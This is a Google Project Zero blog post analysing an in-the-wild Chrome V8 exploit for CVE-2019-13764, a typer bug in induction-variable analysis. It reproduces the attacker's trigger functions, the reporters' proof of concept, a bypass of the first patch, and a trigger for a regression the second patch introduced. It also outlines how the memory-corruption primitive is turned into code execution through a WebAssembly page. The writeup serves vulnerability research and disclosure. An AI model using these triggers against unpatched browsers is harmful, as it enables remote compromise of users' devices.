# In-the-Wild Series: Chrome Infinity Bug - Project Zero

Source: https://projectzero.google/2021/01/in-wild-series-chrome-infinity-bug.html
Captured verbatim (article body extracted from HTML) on 2026-11-12.

---

This is part 2 of a 6-part series detailing a set of vulnerabilities found by Project Zero being exploited in the wild. To read the other parts of the series, see the [introduction post](/2021/01/introducing-in-wild-series.html).

Posted by Sergei Glazunov, Project Zero

This post only covers one of the exploits, specifically a renderer exploit targeting Chrome 73-78 on Android. We use it as an opportunity to talk about an interesting vulnerability class in Chrome’s JavaScript engine.

### Brief introduction to typer bugs

One of the features that make JavaScript code especially difficult to optimize is the dynamic type system. Even for a trivial expression like a + b the engine has to support a multitude of cases depending on whether the parameters are numbers, strings, booleans, objects, etc. JIT compilation wouldn’t make much sense if the compiler always had to emit machine code that could handle every possible type combination for every JS operation. Chrome’s JavaScript engine, V8, tries to overcome this limitation through type speculation. During the first several invocations of a JavaScript function, the interpreter records the type information for various operations such as parameter accesses and property loads. If the function is later selected to be JIT compiled, TurboFan, which is V8’s newest compiler, makes an assumption that the observed types will be used in all subsequent calls, and propagates the type information throughout the whole function graph using the set of rules derived from the language specification. For example: if at least one of the operands to the addition operator is a string, the output is guaranteed to be a string as well; Math.random() always returns a number; and so on. The compiler also puts runtime checks for the speculated types that trigger deoptimization (i.e., revert to execution in the interpreter and update the type feedback) in case one of the assumptions no longer holds.

For integers, V8 goes even further and tracks the possible range of nodes. The main reason behind that is that even though the ECMAScript specification defines Number as the 64-bit floating point type, internally, TurboFan always tries to use the most efficient representation possible in a given context, which could be a 64-bit integer, 31-bit tagged integer, etc. Range information is also employed in other optimizations. For example, the compiler is smart enough to figure out that in the following code snippet, the branch can never be taken and therefore eliminate the whole if statement:

| a = Math.min(a, 1); if (a > 2) { return 3; } | 

Now, imagine there’s an issue that makes TurboFan believe that the function vuln() returns a value in the range \[0; 2\] whereas its actual range is \[0; 4\]. Consider the code below:

| a = vuln(a); let array = \[1, 2, 3\]; return array\[a\]; | 

If the engine has never encountered an out-of-bounds access attempt while running the code in the interpreter, it will instruct the compiler to transform the last line into a sequence that at a certain optimization phase, can be expressed by the following pseudocode:

| if (a >= array.length) { deoptimize(); } let elements = array.\[\[elements\]\]; return elements.get(a); | 

get() acts as a C-style element access operation and performs no bounds checks. In subsequent optimization phases the compiler will discover that, according to the available type information, the length check is redundant and eliminate it completely. Consequently, the generated code will be able to access out-of-bounds data.

The bug class outlined above is the main subject of this blog post; and bounds check elimination is the most popular exploitation technique for this class. A textbook example of such a vulnerability is [the off-by-one issue in the typer rule for String.indexOf](https://bugs.chromium.org/p/chromium/issues/detail?id=762874) found by Stephen Röttger.

A typer vulnerability doesn’t have to immediately result in an integer range miscalculation that would lead to OOB access because it’s possible to make the compiler propagate the error. For example, if vuln() returns an unexpected boolean value, we can easily transform it into an unexpected integer:

| a = vuln(a); // predicted = false; actual = true a = a \* 10; // predicted = 0; actual = 10 let array = \[1, 2, 3\]; return array\[a\]; | 

Another [notable bug report](https://bugs.chromium.org/p/project-zero/issues/detail?id=1710) by Stephen demonstrates that even a subtle mistake such as omitting negative zero can be exploited in the same fashion.

At a certain point, this vulnerability class became extremely popular as it immediately provided an attacker with an enormously powerful and reliable exploitation primitive. Fellow Project Zero member Mark Brand has used it in his [full-chain Chrome exploit](/2019/04/virtually-unlimited-memory-escaping.html). The bug class has made an appearance at several [CTFs](https://www.jaybosamiya.com/blog/2019/01/02/krautflare/) and [exploit competitions](https://bugs.chromium.org/p/chromium/issues/detail?id=906043). As a result, last year the V8 team issued [a hardening patch](https://bugs.chromium.org/p/v8/issues/detail?id=8806) designed to prevent attackers from abusing bounds check elimination. Instead of removing the checks, the compiler started marking them as “aborting”, so in the worst case the attacker can only trigger a SIGTRAP.

### Induction variable analysis

The renderer exploit we’ve discovered takes advantage of an issue in a function designed to compute the type of [induction variables](https://en.wikipedia.org/wiki/Induction_variable). The slightly abridged source code below is taken from the [latest affected revision](https://chromium.googlesource.com/v8/v8.git/+/0da7ca8781c6c7ec852bef845b72ca7f212cdc23/src/compiler/typer.cc) of V8:

| Type Typer::Visitor::TypeInductionVariablePhi(Node\* node) { \[...\] // We only handle integer induction variables (otherwise ranges // do not apply and we cannot do anything). if (!initial\_type.Is(typer\_->cache\_->kInteger) \|\|!increment\_type.Is(typer\_->cache\_->kInteger)) { // Fallback to normal phi typing, but ensure monotonicity. // (Unfortunately, without baking in the previous type, // monotonicity might be violated because we might not yet have // retyped the incrementing operation even though the increment's // type might been already reflected in the induction variable // phi.) Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node) : Type::None(); for (int i = 0; i \< arity; ++i) { type = Type::Union(type, Operand(node, i), zone()); } return type; } // If we do not have enough type information for the initial value // or the increment, just return the initial value's type. if (initial\_type.IsNone() \|\|increment\_type.Is(typer\_->cache\_->kSingletonZero)) { return initial\_type; } \[...\] InductionVariable::ArithmeticType arithmetic\_type = induction\_var->Type(); double min = -V8\_INFINITY; double max = V8\_INFINITY; double increment\_min; double increment\_max; if (arithmetic\_type == InductionVariable::ArithmeticType::kAddition) { increment\_min = increment\_type.Min(); increment\_max = increment\_type.Max(); } else { DCHECK\_EQ(InductionVariable::ArithmeticType::kSubtraction, arithmetic\_type); increment\_min = -increment\_type.Max(); increment\_max = -increment\_type.Min(); } if (increment\_min >= 0) { // increasing sequence min = initial\_type.Min(); for (auto bound : induction\_var->upper\_bounds()) { Type bound\_type = TypeOrNone(bound.bound); // If the type is not an integer, just skip the bound. if (!bound\_type.Is(typer\_->cache\_->kInteger)) continue; // If the type is not inhabited, then we can take the initial // value. if (bound\_type.IsNone()) { max = initial\_type.Max(); break; } double bound\_max = bound\_type.Max(); if (bound.kind == InductionVariable::kStrict) { bound\_max -= 1; } max = std::min(max, bound\_max + increment\_max); } // The upper bound must be at least the initial value's upper // bound. max = std::max(max, initial\_type.Max()); } else if (increment\_max \<= 0) { // decreasing sequence \[...\] } else { // Shortcut: If the increment can be both positive and negative, // the variable can go arbitrarily far, so just return integer. return typer\_->cache\_->kInteger; } \[...\] return Type::Range(min, max, typer\_->zone()); } | 

Now, imagine the compiler processing the following JavaScript code:

| for (var i = initial; i \< bound; i += increment) { \[...\] } | 

In short, when the loop has been identified as increasing, the lower bound of initial becomes the lower bound of i, and the upper bound is calculated as the sum of the upper bounds of bound and increment. There’s a similar branch for decreasing loops, and a special case for variables that can be both increasing and decreasing. The loop variable is named phi in the method because TurboFan operates on an intermediate representation in the [static single assignment](https://en.wikipedia.org/wiki/Static_single_assignment_form) form.

Note that the algorithm only works with integers, otherwise a more conservative estimation method is applied. However, in this context an integer refers to a rather special type, which isn’t bound to any machine integer type and can be represented as a floating point value in memory. The type holds two unusual properties that have made the vulnerability possible:

- +Infinity and -Infinity belong to it, whereas NaN and -0 don’t.
- The type is not closed under addition, i.e., adding two integers doesn’t always result in an integer. Namely, +Infinity + -Infinity yields NaN.

Thus, for the following loop the algorithm infers (-Infinity; +Infinity) as the induction variable type, while the actual value after the first iteration of the loop will be NaN:

| for (var i = -Infinity; i \< 0; i += Infinity) { } | 

This one line is enough to trigger the issue. The exploit author has had to make only two minor changes: (1) parametrize increment in order to make the value of i match the future inferred type during initial invocations in the interpreter and (2) introduce an extra variable to ensure the loop eventually ends. As a result, after deobfuscation, the relevant part of the trigger function looks as follows:

| function trigger(argument) { var j = 0; var increment = 100; if (argument > 2) { increment = Infinity; } for (var i = -Infinity; i \<= -Infinity; i += increment) { j++; if (j == 20) { break; } } \[...\] | 

The resulting type mismatch, however, doesn’t immediately let the attacker run arbitrary code. Given that the previously widely used bounds check elimination technique is no longer applicable, we were particularly interested to learn how the attacker approached exploiting the issue.

### Exploitation

The trigger function continues with a series of operations aimed at transforming the type mismatch into an integer range miscalculation, similarly to what would follow in the previous technique, but with the additional requirement that the computed range must be narrowed down to a single number. Since the discovered exploit targets mobile devices, the exact instruction sequence used in the exploit only works for ARM processors. For the ease of the reader, we've modified it to be compatible with x64 as well.

| \[...\] // The comments display the current value of the variable i, the type // inferred by the compiler, and the machine type used to store // the value at each step. // Initially: // actual = NaN, inferred = (-Infinity, +Infinity) // representation = double i = Math.max(i, 0x100000800); // After step one: // actual = NaN, inferred = \[0x100000800; +Infinity) // representation = double i = Math.min(0x100000801, i); // After step two: // actual = -0x8000000000000000, inferred = \[0x100000800, 0x100000801\] // representation = int64\_t i -= 0x1000007fa; // After step three: // actual = -2042, inferred = \[6, 7\] // representation = int32\_t i >>= 1; // After step four: // actual = -1021, inferred = 3 // representation = int32\_t i += 10; // After step five: // actual = -1011, inferred = 13 // representation = int32\_t \[...\] | 

The first notable transformation occurs in step two. TurboFan decides that the most appropriate representation for i at this point is a 64-bit integer as the inferred range is entirely within int64\_t, and emits the CVTTSD2SI instruction to convert the double argument. Since NaN doesn’t fit in the integer range, the instruction returns the [“indefinite integer value”](https://www.felixcloutier.com/x86/cvttss2si) -0x8000000000000000. In the next step, the compiler determines it can use the even narrower int32\_t type. It discards the higher 32-bit word of i, assuming that for the values in the given range it has the same effect as subtracting 0x100000000, and then further subtracts 0x7fa. The remaining two operations are straightforward; however, one might wonder why the attacker couldn’t make the compiler derive the required single-value type directly in step two. The answer lies in the optimization pass called the constant-folding reducer.

| Reduction ConstantFoldingReducer::Reduce(Node\* node) { DisallowHeapAccess no\_heap\_access; if (!NodeProperties::IsConstant(node) && NodeProperties::IsTyped(node) && node->op()->HasProperty(Operator::kEliminatable) && node->opcode() != IrOpcode::kFinishRegion) { Node\* constant = TryGetConstant(jsgraph(), node); if (constant != nullptr) { ReplaceWithValue(node, constant); return Replace(constant); \[...\] | 

If the reducer discovered that the output type of the NumberMin operator was a constant, it would replace the node with a reference to the constant thus eliminating the type mismatch. That doesn’t apply to the SpeculativeNumberShiftRight and SpeculativeSafeIntegerAdd nodes, which represent the operations in steps four and five while the reducer is running, because they both are capable of triggering deoptimization and therefore not marked as eliminable.

Formerly, the next step would be to abuse this mismatch to optimize away an array bounds check. Instead, the attacker makes use of the incorrectly typed value to create a JavaScript array for which bounds checks always pass even outside the compiled function. Consider the following method, which attempts to optimize array constructor calls:

| Reduction JSCreateLowering::ReduceJSCreateArray(Node\* node) { \[...\] } else if (arity == 1) { Node\* length = NodeProperties::GetValueInput(node, 2); Type length\_type = NodeProperties::GetType(length); if (!length\_type.Maybe(Type::Number())) { // Handle the single argument case, where we know that the value // cannot be a valid Array length. elements\_kind = GetMoreGeneralElementsKind( elements\_kind, IsHoleyElementsKind(elements\_kind) ? HOLEY\_ELEMENTS : PACKED\_ELEMENTS); return ReduceNewArray(node, std::vector\<Node\*>{length}, \*initial\_map, elements\_kind, allocation, slack\_tracking\_prediction); } if (length\_type.Is(Type::SignedSmall()) && length\_type.Min() >= 0 && length\_type.Max() \<= kElementLoopUnrollLimit && length\_type.Min() == length\_type.Max()) { int capacity = static\_cast\<int>(length\_type.Max()); return ReduceNewArray(node, length, capacity, \*initial\_map, elements\_kind, allocation, slack\_tracking\_prediction); \[...\] | 

When the argument is known to be an integer constant less than 16, the compiler inlines the array creation procedure and unrolls the element initialization loop. ReduceJSCreateArray doesn’t rely on the constant-folding reducer and implements its own less strict equivalent that just compares the upper and lower bounds of the inferred type. Unfortunately, even after folding the function keeps using the original argument node. The folded value is employed during initialization of the backing store while the length property of the array is set to the original node. This means that if we pass the value we obtained at step five to the constructor, it will return an array with the negative length and backing store that can fit 13 elements. Given that bounds checks are implemented as unsigned comparisons, the сrafted array will allow us to access data well past its end. In fact, any positive value bigger than its predicted version would work as well.

The rest of the trigger function is provided below:

| \[...\] corrupted\_array = Array(i); corrupted\_array\[0\] = 1.1; ptr\_leak\_array = \[wasm\_module, array\_buffer, \[...\], wasm\_module, array\_buffer\]; extra\_array = \[13.37, \[...\], 13.37, 1.234\]; return \[corrupted\_array, ptr\_leak\_array, extra\_array\]; } | 

The attacker forces TurboFan to put the data required for further exploitation right next to the corrupted array and to use the double element type for the backing store as it’s the most convenient type for dealing with out-of-bounds data in the V8 heap.

From this point on, the exploit follows the same algorithm that public V8 exploits have been following for several years:

1. Locate the required pointers and object fields through pattern-matching.
2. Construct an arbitrary memory access primitive using an extra JavaScript array and ArrayBuffer.
3. Follow the pointer chain from a WebAssembly module instance to locate a writable and executable memory page.
4. Overwrite the body of a WebAssembly function inside the page with the attacker’s payload.
5. Finally, execute it.

The contents of the payload, which is about half a megabyte in size, will be discussed in detail in a subsequent blog post.

Given that the vast majority of Chrome exploits we have seen at Project Zero come from either exploit competitions or VRP submissions, the most striking difference this exploit has demonstrated lies in its focus on stability and reliability. Here are some examples. Almost the entire exploit is executed inside a web worker, which means it has a separate JavaScript environment and runs in its own thread. This greatly reduces the chance of the garbage collector causing an accidental crash due to the inconsistent heap state. The main thread part is only responsible for restarting the worker in case of failure and passing status information to the attacker’s server. The exploit attempts to further reduce the time window for GC crashes by ensuring that every corrupted field is restored to the original value as soon as possible. It also employs the OOB access primitive early on to verify the processor architecture information provided in the user agent header. Finally, the author has clearly aimed to keep the number of hard-coded constants to a minimum. Despite supporting a wide range of Chrome versions, the exploit relies on a single version-dependent offset, namely, the offset in the WASM instance to the executable page pointer.

### Patch 1

Even though there’s evidence this vulnerability has been originally used as a 0-day, by the time we obtained the exploit, it had already been fixed. The issue was [reported to Chrome](https://bugs.chromium.org/p/chromium/issues/detail?id=1028863) by security researchers Soyeon Park and Wen Xu in November 2019 and was assigned CVE-2019-13764. The proof of concept provided in the report is shown below:

| function write(begin, end, step) { for (var i = begin; i >= end; i += step) { step = end - begin; begin >>>= 805306382; } } var buffer = new ArrayBuffer(16384); var view = new Uint32Array(buffer); for (let i = 0; i \< 10000; i++) { write(Infinity, 1, view\[65536\], 1); } | 

As the reader can see, it’s not the most straightforward way to trigger the issue. The code resembles fuzzer output, and the reporters confirmed that the bug had been found through fuzzing. Given the available evidence, we’re fully confident that it was an independent discovery (sometimes referred to as a "bug collision").

Since the proof of concept could only lead to a SIGTRAP crash, and the reporters hadn’t demonstrated, for example, a way to trigger memory corruption, it was initially considered a low-severity issue by the V8 engineers, however, after an internal discussion, the V8 team raised the severity rating to high.

In the light of the in-the-wild exploitation evidence, we decided to give [the fix](https://chromium.googlesource.com/v8/v8.git/+/b8b6075021ade0969c6b8de9459cd34163f7dbe1), which had introduced an explicit check for the NaN case, a thorough examination:

| \[...\] const bool both\_types\_integer = initial\_type.Is(typer\_->cache\_->kInteger) && increment\_type.Is(typer\_->cache\_->kInteger); bool maybe\_nan = false; // The addition or subtraction could still produce a NaN, if the integer // ranges touch infinity. if (both\_types\_integer) { Type resultant\_type = (arithmetic\_type == InductionVariable::ArithmeticType::kAddition) ? typer\_->operation\_typer()->NumberAdd(initial\_type, increment\_type) : typer\_->operation\_typer()->NumberSubtract(initial\_type, increment\_type); maybe\_nan = resultant\_type.Maybe(Type::NaN()); } // We only handle integer induction variables (otherwise ranges // do not apply and we cannot do anything). if (!both\_types\_integer \|\| maybe\_nan) { \[...\] | 

The code makes the assumption that the loop variable may only become NaN if the sum or difference of initial and increment is NaN. At first sight, it seems like a fair assumption. The issue arises from the fact that the value of increment can be changed from inside the loop, which isn’t obvious from the exploit but demonstrated in the proof of concept sent to Chrome. The typer takes into account these changes and reflects them in increment’s computed type. Therefore, the attacker can, for example, add negative increment to i until the latter becomes -Infinity, then change the sign of increment and force the loop to produce NaN once more, as demonstrated by the code below:

| var increment = -Infinity; var k = 0; for (var i = 0; i \< 1; i += increment) { if (i == -Infinity) { increment = +Infinity; } if (++k > 10) { break; } } | 

Thus, to “revive” the entire exploit, the attacker only needs to change a couple of lines in trigger.

### Patch 2

The discovered variant was [reported to Chrome](https://bugs.chromium.org/p/chromium/issues/detail?id=1051017) in February along with the exploitation technique found in the exploit. This time [the patch](https://chromium.googlesource.com/v8/v8.git/+/a2e971c56d1c46f7c71ccaf33057057308cc8484) took a more conservative approach and made the function bail out as soon as the typer detects that increment can be Infinity.

| \[...\] // If we do not have enough type information for the initial value or // the increment, just return the initial value's type. if (initial\_type.IsNone() \|\|increment\_type.Is(typer\_->cache\_->kSingletonZero)) { return initial\_type; } // We only handle integer induction variables (otherwise ranges do not // apply and we cannot do anything). Moreover, we don't support infinities // in {increment\_type} because the induction variable can become NaN // through addition/subtraction of opposing infinities. if (!initial\_type.Is(typer\_->cache\_->kInteger) \|\|!increment\_type.Is(typer\_->cache\_->kInteger) \|\|increment\_type.Min() == -V8\_INFINITY \|\|increment\_type.Max() == +V8\_INFINITY) { \[...\] | 

Additionally, ReduceJSCreateArray [was updated](https://chromium.googlesource.com/v8/v8.git/+/6516b1ccbe6f549d2aa2fe24510f73eb3a33b41a) to always use the same value for both the  length property and backing store capacity, thus rendering the reported exploitation technique useless.

Unfortunately, the new patch contained an unintended change that introduced another security issue. If we look at [the source code](https://chromium.googlesource.com/v8/v8.git/+/0da7ca8781c6c7ec852bef845b72ca7f212cdc23/src/compiler/typer.cc#845) of TypeInductionVariablePhi before the patches, we find that it checks whether the type of increment is limited to the constant zero. In this case, it assigns the type of initial to the induction variable. The second patch moved the check above the line that ensures initial is an integer. In JavaScript, however, adding or subtracting zero doesn’t necessarily preserve the type, for example:

|  |  | -0 | + | 0 | => | -0 | 
|  |  | \[string\] | - | 0 | => | \[number\] | 
|  |  | \[object\] | + | 0 | => | \[string\] | 

As a result, the patched function provides us with an even wider choice of possible “type confusions”.

It was considered worthwhile to examine how difficult it would be to find a replacement for the ReduceJSCreateArray technique and exploit the new issue. The task turned out to be a lot easier than initially expected because we soon found [this excellent blog post](https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/) written by Jeremy Fetiveau, where he describes a way to bypass the initial bounds check elimination hardening. In short, depending on whether the engine has encountered an out-of-bounds element access attempt during the execution of a function in the interpreter, it instructs the compiler to emit either the CheckBounds or NumberLessThan node, and only the former is covered by the hardening. Consequently, the attacker just needs to make sure that the function attempts to access a non-existent array element in one of the first few invocations.

We find it interesting that even though this equally powerful and convenient technique has been publicly available since last May, the attacker has chosen to rely on their own method. It is conceivable that the exploit had been developed even before the blog post came out.

Once again, the technique requires an integer with a miscalculated range, so the revamped trigger function mostly consists of various type transformations:

| function trigger(arg) { // Initially: // actual = 1, inferred = any var k = 0; arg = arg \| 0; // After step one: // actual = 1, inferred = \[-0x80000000, 0x7fffffff\] arg = Math.min(arg, 2); // After step two: // actual = 1, inferred = \[-0x80000000, 2\] arg = Math.max(arg, 1); // After step three: // actual = 1, inferred = \[1, 2\] if (arg == 1) { arg = "30"; } // After step four: // actual = string{30}, inferred = \[1, 2\] or string{30} for (var i = arg; i \< 0x1000; i -= 0) { if (++k > 1) { break; } } // After step five: // actual = number{30}, inferred = \[1, 2\] or string{30} i += 1; // After step six: // actual = 31, inferred = \[2, 3\] i >>= 1; // After step seven: // actual = 15, inferred = 1 i += 2; // After step eight: // actual = 17, inferred = 3 i >>= 1; // After step nine: // actual = 8, inferred = 1 var array = \[0.1, 0.1, 0.1, 0.1\]; return \[array\[i\], array\]; } | 

The mismatch between the number 30 and string “30” occurs in step five. The next operation is represented by the SpeculativeSafeIntegerAdd node. The typer is aware that whenever this node encounters a non-number argument, it immediately triggers deoptimization. Hence, all non-number elements of the argument type can be ignored. The unexpected integer value, which obviously doesn’t cause the deoptimization, enables us to generate an erroneous range. Eventually, the compiler eliminates the NumberLessThan node, which is supposed to protect the element access in the last line, based on the observed range.

### Patch 3

Soon after we had identified the regression, the V8 team landed [a patch](https://chromium.googlesource.com/v8/v8.git/+/68099bffaca0b4cfa10eb0178606aa55fd85d8ef) that removed the vulnerable code branch. They also took a number of additional hardening measures, for example:

- Extended [element access hardening](https://chromium.googlesource.com/v8/v8.git/+/fa5fc748e53ad9d3ca44050d07659e858dbffd94), which now prevents the abuse of NumberLessThan nodes.
- Discovered and [fixed a similar problem](https://chromium.googlesource.com/v8/v8.git/+/c85aa83087e7146281a95369cadf943ef78bf321) with the elimination of MaybeGrowFastElements. Under certain conditions, this node, which may resize the backing store of a given array, is placed before StoreElement to ensure the array can fit the element. Consequently, the elimination of the node could allow an attacker to write data past the end of the backing store.
- [Implemented a verifier](https://chromium.googlesource.com/v8/v8.git/+/e440eda4ad9bfd8983c9896de574556e8eaee406) for induction variables that validates the computed type against the more conservative regular phi typing.

Furthermore, the V8 engineers have been working on [a feature](https://chromium.googlesource.com/v8/v8.git/+/2e82ead865d088890bbfd14abfb22b8055b35394) that allows TurboFan to insert runtime type checks into generated code. The feature should make fuzzing for typer issues much more efficient.

### Conclusion

This blog post is meant to provide insight into the complexity of type tracking in JavaScript. The number of obscure rules and constraints an engineer has to bear in mind while working on the feature almost inevitably leads to errors, and, quite often even the slightest issue in the typer is enough to build a powerful and reliable exploit.

Also, the reader is probably familiar with the hypothesis of an enormous disparity between the state of public and private offensive security research. The fact that we’ve discovered a rather sophisticated attacker who has exploited a vulnerability in the class that has been under the scrutiny of the wider security community for at least a couple of years suggests that there’s nevertheless a certain overlap. Moreover, we were especially pleased to see a bug collision between a VRP submission and an in-the-wild 0-day exploit.

This is part 2 of a 6-part series detailing a set of vulnerabilities found by Project Zero being exploited in the wild. To continue reading, see [In The Wild Part 3: Chrome Exploits](/2021/01/in-wild-series-chrome-exploits.html).
